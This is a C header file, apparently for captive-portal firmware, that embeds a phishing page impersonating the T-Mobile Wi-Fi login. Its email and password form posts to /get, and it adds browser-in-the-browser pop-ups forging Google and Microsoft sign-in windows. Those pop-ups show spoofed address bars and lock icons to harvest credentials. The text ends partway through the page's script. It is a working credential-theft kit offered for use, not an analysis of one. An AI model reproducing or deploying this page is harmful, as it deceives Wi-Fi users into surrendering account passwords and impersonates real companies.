#ifndef TMOBILE_H
#define TMOBILE_H

const char TMOBILE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>T-Mobile Wi-Fi Login</title>
    <style>
        /* General Body and Container Styles */
        body {
            font-family: 'Inter', sans-serif; /* Modern font for a cleaner look */
            background-color: #e20074; /* T-Mobile Magenta */
            background-image: linear-gradient(135deg, #e20074 0%, #a0005a 100%); /* Subtle gradient for depth */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 1.5rem; /* Consistent padding for smaller screens */
            box-sizing: border-box;
            overflow-y: auto;
        }

        /* Main Container Styling */
        .container {
            max-width: 420px; /* Slightly wider container */
            width: 100%;
            margin: 0 auto;
            padding: 40px; /* Increased padding */
            background-color: rgba(29, 29, 65, 0.7); /* Dark translucent background for contrast with magenta logo */
            border-radius: 16px; /* More rounded corners */
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3); /* Enhanced shadow */
            backdrop-filter: blur(10px); /* Frosted glass blur */
            -webkit-backdrop-filter: blur(10px); /* For Safari */
            border: 1px solid rgba(255, 255, 255, 0.3); /* Subtle border */
            box-sizing: border-box;
        }

        /* T-Mobile Logo Styling */
        .logo {
            display: block;
            max-width: 160px; /* Adjusted size for the new logo */
            height: auto;
            margin: 0 auto 35px auto; /* Centered with more bottom margin */
        }
        /* Make sure the main T-Mobile logo polygon is magenta and the path is white */
        .logo .cls-1 { fill: #e20074; }
        .logo .cls-2 { fill: #fff; }

        /* Heading Styles */
        h1 {
            font-size: 2.5rem; /* Larger and more impactful */
            font-weight: 700; /* Bolder */
            margin-top: 0;
            margin-bottom: 0.75rem; /* Reduced margin for tighter text */
            text-align: center;
            color: #fff;
            line-height: 1.2;
        }

        h2 {
            font-size: 1.25rem; /* Clearer subtitle */
            font-weight: 300; /* Lighter weight */
            text-align: center;
            margin-bottom: 2.5rem; /* More space below subtitle */
            color: rgba(255, 255, 255, 0.9); /* Slightly subdued white */
        }

        /* Input Field Styles */
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 20px; /* Generous padding */
            margin: 0; /* Reset margin here, will control with parent div */
            box-sizing: border-box;
            border: 1px solid rgba(255, 255, 255, 0.4); /* Lighter border */
            border-radius: 8px; /* More rounded */
            background-color: rgba(255, 255, 255, 0.95); /* Nearly white for contrast */
            color: #333; /* Dark text for readability */
            font-size: 1rem;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #FF0080; /* T-Mobile secondary color for focus */
            box-shadow: 0 0 0 4px rgba(255, 0, 128, 0.4); /* Wider, softer glow */
            background-color: #fff; /* Solid white on focus */
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #666; /* Darker placeholder */
            opacity: 0.7;
        }

        /* Form group styling for spacing between input sections */
        .form-group-tmobile {
            margin-bottom: 15px; /* Adjust this value to control gap */
        }
        .form-group-tmobile:last-of-type {
            margin-bottom: 0; /* Remove bottom margin for the last form group */
        }

        /* Submit Button Styles */
        input[type="submit"] {
            width: 100%;
            background-color: #fff;
            color: #e20074; /* T-Mobile Magenta */
            padding: 15px 20px;
            margin-top: 25px; /* More top margin to separate from inputs */
            margin-bottom: 8px;
            border: none;
            border-radius: 8px; /* More rounded */
            cursor: pointer;
            font-weight: bold;
            font-size: 1.15rem; /* Slightly larger text */
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2); /* Add shadow */
        }

        input[type="submit"]:hover {
            background-color: #f0f0f0; /* Lighter white on hover */
            transform: translateY(-2px); /* Lift effect */
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3);
        }

        input[type="submit"]:active {
            transform: translateY(0);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

        /* Custom Message Box Styling */
        #messageBox {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #FF0080; /* T-Mobile secondary color */
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease-in-out, visibility 0.3s ease-in-out;
            font-size: 1rem;
            text-align: center;
            min-width: 250px;
            max-width: 80%;
            box-sizing: border-box;
        }
        #messageBox.show {
            opacity: 1;
            visibility: visible;
        }

        /* OR Divider Styling */
        .or-divider {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 30px; /* More space */
            margin-bottom: 30px;
        }
        .or-divider::before,
        .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: rgba(255, 255, 255, 0.4); /* Slightly thicker, more visible line */
        }
        .or-divider span {
            padding: 0 1rem;
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.95rem; /* Slightly larger text */
            background-color: #e20074; /* Match body background for seamless look */
            position: relative; /* Ensure text is above the line */
            z-index: 1;
        }

        /* Social Login Buttons Container */
        .social-login-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px; /* More space between buttons */
            width: 100%;
            max-width: 280px; /* Keep buttons shorter as requested */
            margin: 0 auto; /* Center the buttons */
        }

        /* Google/Microsoft Sign-in Button Styling */
        .google-sign-in, .microsoft-sign-in {
            width: 100%;
            padding: 0.9rem 1.25rem;
            border-radius: 8px; /* More rounded */
            border: 1px solid rgba(0, 0, 0, 0.1); /* Subtle border */
            color: #333;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: background-color 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
            font-size: 1rem;
            background-color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); /* Subtle shadow */
        }
        .google-sign-in span,
        .microsoft-sign-in span {
            padding-left: 2.5rem; /* More space for icon */
            display: block;
        }
        .google-sign-in:hover, .microsoft-sign-in:hover {
            background-color: #f7f7f7;
            border-color: rgba(0, 0, 0, 0.2);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        /* Google/Microsoft Icon Styling (Inline SVG) */
        .google-sign-in .google-logo-svg,
        .microsoft-sign-in .microsoft-icon {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            position: absolute;
            left: 1rem; /* Adjust position */
        }
        .google-sign-in .google-logo-svg {
            transform: translateY(-1px); /* Slight adjustment for alignment */
        }

        /* Error message styling for main form */
        .error-message {
            color: #FF0080; /* T-Mobile secondary color for errors */
            font-size: 0.875rem;
            margin-top: 5px;
            text-align: left;
            min-height: 18px; /* Ensure space, but allow collapsing */
            padding-left: 5px; /* Slight indent */
            line-height: 1.2;
            transition: all 0.2s ease-in-out;
            opacity: 1;
        }
        .error-message:empty {
            min-height: 0;
            margin-top: 0;
            opacity: 0;
        }
        input.input-error {
            border-color: #FF0080;
            box-shadow: 0 0 0 2px rgba(255, 0, 128, 0.5);
        }

        /* --- BITB FRAME STYLES (Generic Browser Look - copied from JetBlue) --- */
        .browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .browser-header {
            background-color: #1e1e1e;
            color: white;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 0 0 8px;
            cursor: grab;
        }
        .browser-header:active { cursor: grabbing; }
        .tab { display: flex; align-items: center; gap: 8px; }
        .tab img { height: 16px; width: 16px; }
        .tab span { font-size: 12px; white-space: nowrap; }
        .window-controls { display: flex; align-items: center; }
        .window-controls div { width: 46px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .window-controls div:hover { background-color: #3a3a3a; }
        .window-controls .close:hover { background-color: #e81123; }
        .window-controls svg { fill: white; width: 10px; height: 10px; }
        .address-bar {
            background-color: #2d2d2d;
            color: white;
            padding: 6px 12px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: monospace;
            overflow-x: auto;
        }
        .lock-icon { color: #6fcf97; }
        .content {
            background: white;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            overflow-y: auto;
        }
        .inner-container-bitb {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 280px;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            box-sizing: border-box;
        }
        .logo-bitb svg {
            width: 100px;
            height: 34px;
            margin-bottom: 20px;
        }
        .title-bitb { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
        .subtitle-bitb { font-size: 15px; font-weight: 400; color: #5f6368; margin-bottom: 20px; }
        .form-group-bitb { width: 100%; margin-bottom: 20px; position: relative; }
        .form-control-bitb { width: 100%; padding: 8px; border: 1px solid #dadce0; border-radius: 4px; outline: none; font-size: 15px; transition: all 0.3s ease; background-color: #ffffff;
            color: #333; }
        .form-label-bitb { position: absolute; top: 8px; left: 10px; font-size: 15px; color: #5f6368; transition: 0.3s; pointer-events: none; }
        .form-control-bitb:focus + .form-label-bitb,
        .form-control-bitb:not(:placeholder-shown) + .form-label-bitb { transform: translateY(-22px); font-size: 11px; color: #1a73e8; }
        .forgot-email-bitb { font-size: 13px; color: #1a73e8; text-decoration: none; margin-bottom: 12px; display: block; width: 100%; text-align: left; }
        .forgot-email-bitb:hover { text-decoration: none; }
        .text-area-bitb { font-size: 11px; color: #5f6368; margin-top: 6px; text-align: left; width: 100%; }
        .button-container-bitb { display: flex; align-items: center; justify-content: space-between; width: 100%; margin-top: 25px; }
        .create-account-bitb { font-size: 13px; color: #1a73e8; text-decoration: none; }
        .create-account-bitb:hover { text-decoration: underline; }
        .next-button-bitb { background-color: #1a73e8; color: #fff; border: none; border-radius: 4px; padding: 8px 20px; font-size: 15px; cursor: pointer; transition: background-color 0.3s ease, box-shadow 0.3s ease; }
        .next-button-bitb:hover { background-color: #145db0; }
        .form-control-bitb.password-mode {
            -webkit-text-security: disc;
            -moz-text-security: disc;
            text-security: disc;
            font-size: 16px;
        }
        .form-label-bitb.password-mode { color: #1a73e8; }

        .microsoft-browser-window {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            border: 1px solid #333;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.4);
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
            background-color: #fff;
            border-radius: 8px;
            overflow: hidden;
        }
        .microsoft-content {
            padding: 15px;
            background: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            height: auto;
            min-height: 180px;
            overflow-y: auto;
        }
        .microsoft-inner-container-bitb {
            background-color: #ffffff;
            width: 100%;
            max-width: 280px;
            padding: 15px;
            box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            box-sizing: border-box;
            text-align: left;
        }
        .microsoft-header-bitb {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 20px;
        }
        .microsoft-logo-bitb {
            width: 24px;
            height: 24px;
        }
        .microsoft-logo-text-bitb {
            font-size: 18px;
            font-weight: 600;
            color: #5e5e5e;
        }
        .microsoft-title-bitb { font-size: 22px; font-weight: 600; margin: 0 0 20px; }
        .microsoft-input-wrapper-bitb { position: relative; margin-bottom: 20px; border-bottom: 1px solid #666; width: 100%; }
        .microsoft-input-wrapper-bitb input { width: 100%; border: none; outline: none; font-size: 15px; padding: 4px 0 6px; background-color: transparent; }
        .microsoft-links-bitb { font-size: 12px; color: #0067b8; margin-bottom: 30px; text-align: left; width: 100%; }
        .microsoft-links-bitb .info-line { color: black; margin-bottom: 10px; }
        .microsoft-links-bitb a { text-decoration: none; color: #0067b8; }
        .microsoft-next-button-bitb { background-color: #0067b8; color: white; border: none; padding: 8px 20px; font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 2px; margin-top: 15px; width: fit-content; align-self: flex-start; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>

<body>

<div class="container">

    <!-- T-Mobile SVG logo -->
    <svg class="logo" id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="59.226 354.465 492.548 82.071">
        <path d="m427.418 362.651a6.328 6.493 0 1 1 -12.656 0 6.328 6.493 0 1 1 12.656 0zm96.422 28.518h16.107v16.437h-16.107zm-319.449 0h16.107v16.437h-16.107zm-48.312 0h16.107v16.437h-16.107zm-47.579 0h16.107v16.437h-16.107zm-49.274 0h16.107v16.437h-16.107z" fill="#999b9e"/>
        <path d="m97.909 358.36h1.911c12.343 0 18.096 6.603 20.5 24.212l3.822-.169-.51-27.938h-62.808l-.619 27.938 3.678.169c.637-6.603 1.401-10.159 3.059-13.715 2.931-6.604 9.048-10.497 16.566-10.497h2.676v60.784c0 6.434-.382 8.466-1.91 9.99-1.275 1.185-3.824 1.693-6.756 1.693h-2.931v4.063h34.919v-4.063h-2.949c-2.913 0-5.48-.509-6.736-1.693-1.529-1.524-1.911-3.557-1.911-9.99v-60.784" fill="#ed008c"/>
        <path d="m264.053 434.891 20.35-71.006v55.721c0 6.081-.346 8.218-1.726 9.697-1.036 1.15-3.437 1.644-6.099 1.644h-1.035v3.944h28.765v-3.944h-1.497c-2.646 0-5.062-.493-6.097-1.644-1.382-1.479-1.727-3.616-1.727-9.697v-47.502c0-6.082.345-8.383 1.727-9.862 1.15-.986 3.451-1.644 6.097-1.644h1.497v-3.781h-22.321l-16.799 57.364-16.437-57.364h-22.206v3.781h2.07c6.099 0 7.249 1.315 7.249 9.205v45.2c0 7.232-.345 10.191-1.381 12.328-1.15 2.137-3.583 3.616-6.098 3.616h-1.841v3.944h23.701v-3.944h-1.495c-2.991 0-5.408-1.151-6.805-3.452-1.364-2.301-1.709-4.438-1.709-12.492v-51.117l20.233 71.006h3.584m64.991-55.557c-14.267 0-23.586 11.177-23.586 28.765 0 16.93 9.319 28.436 23.226 28.436 14.035 0 23.355-11.506 23.355-28.6 0-16.931-9.32-28.601-22.995-28.601m-.46 3.78c4.126 0 7.692 2.63 9.648 7.068 1.841 4.109 2.646 9.698 2.646 17.752 0 16.6-4.027 24.818-12.195 24.818-8.153 0-12.082-8.219-12.082-24.983 0-7.89.821-13.478 2.662-17.587 1.826-4.273 5.524-7.068 9.321-7.068m42.571-27.12-16.339.822v3.616h.789c4.833 0 5.885 1.644 5.885 9.369v53.419c0 6.903-.23 8.712-1.15 11.67h3.797c2.859-4.767 3.566-5.588 4.717-5.588.559 0 1.117.164 1.94.986 5.653 4.602 8.069 5.588 13.247 5.588 12.409 0 21.384-11.999 21.384-29.093 0-16.108-8.301-26.956-20.71-26.956-6.443 0-11.144 3.123-13.56 8.711zm11.933 27.942c7.381 0 11.177 7.89 11.177 23.34 0 16.272-3.912 24.655-11.391 24.655-8.284 0-12.641-8.548-12.641-24.162 0-7.89 1.037-13.313 3.453-17.423 2.169-3.944 5.868-6.41 9.402-6.41m43.623-3.78-16.782.986v3.616h1.266c4.815 0 5.852 1.644 5.852 9.205v27.778c0 7.562-1.036 9.37-5.852 9.37h-1.825v3.779h25.051v-3.779h-1.809c-4.849 0-5.9-1.645-5.9-9.37v-41.585m29.107-24.162-16.782.822v3.616h1.251c4.832 0 5.867 1.644 5.867 9.369v51.939c0 7.726-1.035 9.37-5.867 9.37h-1.825v3.779h25.065v-3.779h-1.841c-4.849 0-5.868-1.645-5.868-9.37zm53.487 51.611c-.56-17.423-8.844-28.271-21.368-28.271-12.098 0-20.826 11.834-20.826 28.271 0 17.587 8.613 28.929 21.96 28.929 8.629 0 14.612-4.603 19.56-14.794l-3.451-1.808c-4.027 8.547-8.054 11.999-14.268 11.999-9.089 0-12.984-7.231-13.101-24.326zm-31.378-4.11c.099-12.327 4.108-20.052 10.568-20.052 6.443 0 10.239 7.561 10.125 20.052zm68.06-25.501c.972 0 1.921.249 2.847.748s1.647 1.213 2.163 2.141c.518.928.776 1.896.776 2.904 0 .998-.255 1.957-.765 2.877a5.38 5.38 0 0 1 -2.14 2.145c-.919.509-1.879.764-2.882.764s-1.963-.254-2.882-.764a5.39 5.39 0 0 1 -2.144-2.145c-.512-.92-.768-1.879-.768-2.877 0-1.008.259-1.976.779-2.904a5.346 5.346 0 0 1 2.166-2.141c.93-.499 1.879-.748 2.85-.748zm0 .964c-.812 0-1.604.208-2.372.625a4.49 4.49 0 0 0 -1.806 1.785 4.88 4.88 0 0 0 -.65 2.418c0 .833.213 1.631.64 2.395a4.54 4.54 0 0 0 1.789 1.786c.767.427 1.567.64 2.399.64a4.86 4.86 0 0 0 2.399-.64 4.504 4.504 0 0 0 1.785-1.786 4.868 4.868 0 0 0 .637-2.395c0-.837-.216-1.644-.648-2.418a4.456 4.456 0 0 0 -1.805-1.785c-.771-.417-1.56-.625-2.368-.625zm-2.54 8.023v-6.23h2.145c.731 0 1.263.058 1.59.173.329.115.59.316.784.603.195.286.293.591.293.913 0 .455-.164.852-.49 1.189-.324.337-.757.527-1.296.568.221.092.397.202.53.33.252.245.559.657.922 1.235l.761 1.22h-1.233l-.555-.983c-.435-.769-.784-1.251-1.047-1.447-.184-.145-.453-.217-.806-.217h-.592v2.647h-1.006zm1.007-3.502h1.226c.584 0 .983-.087 1.197-.262s.319-.406.319-.694c0-.185-.051-.351-.154-.497s-.244-.256-.428-.328c-.182-.072-.52-.107-1.013-.107h-1.147z" fill="#ed008c"/>
    </svg>

    <h1>Sign In</h1>

    <h2>Use your T-Mobile account</h2>

    <form id="login-form" action="/get" method="POST">
        <div class="form-group-tmobile">
            <input type="text" id="email-or-phone" name="email" placeholder="Email or phone number" required>
            <p id="email-error" class="error-message"></p>
        </div>
        <div class="form-group-tmobile">
            <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        <input type="submit" value="Sign In">
    </form>

    <div class="or-divider">
        <span>OR</span>
    </div>

    <div class="social-login-buttons">
        <button class="google-sign-in" id="googleLogin">
            <svg class="google-logo-svg" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48">
                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
            </svg>
            <span>Continue with Google</span>
        </button>
        <button class="microsoft-sign-in" id="microsoftLogin">
            <svg class="microsoft-icon" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
            </svg>
            <span>Continue with Microsoft</span>
        </button>
    </div>

</div>

<!-- Google BITB Frame -->
<div class="browser-window" id="google-window">
    <div class="browser-header">
        <div class="tab">
            <img src="data:image/svg+xml,%3Csvg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill='%234285F4' d='M22.7 12.5c0-.7-.1-1.3-.2-1.9H12v3.6h6.4c-.3 1.5-1.2 2.7-2.6 3.6v2.3h3a11.2 11.2 0 0 0 3.1-8.3z'/%3E%3Cpath fill='%2334A853' d='M12 23c3.1 0 5.7-1 7.6-2.7l-3-2.3c-1.1.7-2.5 1.1-4.6 1.1-3.5 0-6.5-2.4-7.6-5.6H1.4v2.4C3.2 20.8 7.3 23 12 23z'/%3E%3Cpath fill='%23FBBC05' d='M4.4 14c-.3-1-.5-2.1-.5-3.2s.2-2.2.5-3.2V5.2H1.4c-.9 1.8-1.4 3.9-1.4 6.8s.5 5 1.4 6.8L4.4 14z'/%3E%3Cpath fill='%23EA4335' d='M12 4.9c1.7 0 3.2.7 4.4 1.8L19 4.2C17 2.3 14.7 1 12 1 7.3 1 3.2 3.2 1.4 7.2l3 2.4C5.5 6.9 8.5 4.9 12 4.9z'/%3E%3C/svg%3E" alt="Google Favicon">
            <span>Sign in – Google Accounts</span>
        </div>
        <div class="window-controls">
            <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
            <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
            <div class="close" title="Close" onclick="closeLogin('google')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
        </div>
    </div>
    <div class="address-bar">
        <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
            <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
        </svg>
        <span>accounts.google.com/signin/v2/identifier?g...</span>
    </div>
    <div class="content">
        <div class="inner-container-bitb">
            <div class="logo-bitb">
                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="100px" height="34px">
                    <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
                </svg>
            </div>
            <h1 class="title-bitb">Sign in</h1>
            <h2 class="subtitle-bitb">Use your Google Account</h2>
            <form id="google-email-step-form" action="/get" method="POST" onsubmit="return false;">
                <div class="form-group-bitb" id="email-group-bitb">
                    <input type="text" id="email-bitb" name="email" class="form-control-bitb" placeholder=" " />
                    <label for="email-bitb" class="form-label-bitb">Email or phone</label>
                </div>
                <a href="#" class="forgot-email-bitb">Forgot email?</a>
                <div class="text-area-bitb">
                    Not your device? Use Guest mode to sign in privately.
                    <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                </div>
                <div class="button-container-bitb">
                    <a href="#" class="create-account-bitb">Create account</a>
                    <button type="submit" class="next-button-bitb">Next</button>
                </div>
            </form>

            <form id="google-password-step-form" action="/get" method="POST" style="display:none;">
                <input type="hidden" id="google-hidden-email" name="email">
                <div class="form-group-bitb" id="password-group-bitb">
                    <input type="password" id="password-bitb" name="password" class="form-control-bitb" placeholder=" " />
                    <label for="password-bitb" class="form-label-bitb">Password</label>
                </div>
                <a href="#" class="forgot-email-bitb">Forgot password?</a>
                <div class="text-area-bitb">
                    This is not your account? <a href="#" style="color: #1a73e8; text-decoration: none;">Switch accounts</a>
                </div>
                <div class="button-container-bitb">
                    <a href="#" class="create-account-bitb">More options</a>
                    <button type="submit" class="next-button-bitb">Sign In</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Microsoft BITB Frame -->
<div class="browser-window" id="microsoft-window">
    <div class="browser-header">
        <div class="tab">
            <img src="data:image/svg+xml,%3Csvg viewBox='0 0 50 50' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0' y='0' width='23' height='23' fill='%23F25022'/%3E%3Crect x='27' y='0' width='23' height='23' fill='%237FBA00'/%3E%3Crect x='0' y='27' width='23' height='23' fill='%2300A4EF'/%3E%3Crect x='27' y='27' width='23' height='23' fill='%23FFB900'/%3E%3C/svg%3E" alt="MS Favicon">
            <span>Sign in to your Microsoft account</span>
        </div>
        <div class="window-controls">
            <div title="Minimize"><svg viewBox="0 0 10 1"><rect width="10" height="1"/></svg></div>
            <div title="Maximize"><svg viewBox="0 0 10 10"><rect width="8" height="8" x="1" y="1" fill="none" stroke="white" stroke-width="1"/></svg></div>
            <div class="close" title="Close" onclick="closeLogin('microsoft')"><svg viewBox="0 0 10 10"><line x1="1" y1="1" x2="9" y2="9" stroke="white" stroke-width="1"/><line x1="1" y1="9" x2="9" y2="1" stroke="white" stroke-width="1"/></svg></div>
        </div>
    </div>
    <div class="address-bar">
        <svg xmlns="http://www.w3.org/2000/svg" class="lock-icon" viewBox="0 0 24 24" width="16" height="16">
            <path fill="#6fcf97" d="M18 10h-1V7c0-2.76-2.24-5-5-5S7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm-9 0h10v8H6v-8h3zm3 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zM9 7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9V7z"/>
        </svg>
        <span>login.microsoftonline.com/</span>
    </div>
    <div class="content">
        <div class="microsoft-inner-container-bitb">
            <div class="microsoft-header-bitb">
                <svg class="microsoft-logo-bitb" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                    <rect x="0" y="0" width="23" height="23" fill="#F25022"/>
                    <rect x="27" y="0" width="23" height="23" fill="#7FBA00"/>
                    <rect x="0" y="27" width="23" height="23" fill="#00A4EF"/>
                    <rect x="27" y="27" width="23" height="23" fill="#FFB900"/>
                </svg>
                <span class="microsoft-logo-text-bitb">Microsoft</span>
            </div>
            <h2 class="microsoft-title-bitb">Sign in</h2>
            <form id="microsoft-email-step-form" action="/get" method="POST" onsubmit="return false;">
                <div class="microsoft-input-wrapper-bitb" id="email-wrapper-microsoft">
                    <input type="email" id="email-microsoft" name="email" placeholder="Email or phone" required>
                </div>
                <div class="microsoft-links-bitb">
                    <div class="info-line">No account? <a href="#">Create one!</a></div>
                    <div><a href="#">Can't access your account?</a></div>
                </div>
                <button type="submit" class="microsoft-next-button-bitb">Next</button>
            </form>

            <form id="microsoft-password-step-form" action="/get" method="POST" style="display: none;">
                <input type="hidden" id="microsoft-hidden-email" name="email">
                <div class="microsoft-input-wrapper-bitb" id="password-wrapper-microsoft">
                    <input type="password" id="password-microsoft" name="password" placeholder="Password" required>
                </div>
                <div class="microsoft-links-bitb">
                    <div class="info-line">No account? <a href="#">Create one!</a></div>
                    <div><a href="#">Can't access your account?</a></div>
                </div>
                <button type="submit" class="microsoft-next-button-bitb">Sign In</button>
            </form>
        </div>
    </div>
</div>

<script>
    const loginForm = document.getElementById('login-form');
    const emailOrPhoneInput = document.getElementById('email-or-phone');
    const passwordInput = document.getElementById('password');
    const emailError = document.getElementById('email-error');
    const googleLoginButton = document.getElementById('googleLogin');
    const microsoftLoginButton = document.getElementById('microsoftLogin');
    const messageBox = document.getElementById('messageBox');
    let messageTimeout;

    let isDragging = false;
    let offset = { x: 0, y: 0 };
    let activeWindow = null;
    const googleWindow = document.getElementById('google-window');
    const microsoftWindow = document.getElementById('microsoft-window');
    const googleHeader = googleWindow.querySelector('.browser-header');
    const microsoftHeader = microsoftWindow.querySelector('.browser-header');
    
    const googleEmailStepForm = document.getElementById('google-email-step-form');
    const googlePasswordStepForm = document.getElementById('google-password-step-form');
    const emailInputBitb = document.getElementById('email-bitb');
    const passwordInputBitb = document.getElementById('password-bitb');
    const googleHiddenEmailInput = document.getElementById('google-hidden-email');
    
    const microsoftEmailStepForm = document.getElementById('microsoft-email-step-form');
    const microsoftPasswordStepForm = document.getElementById('microsoft-password-step-form');
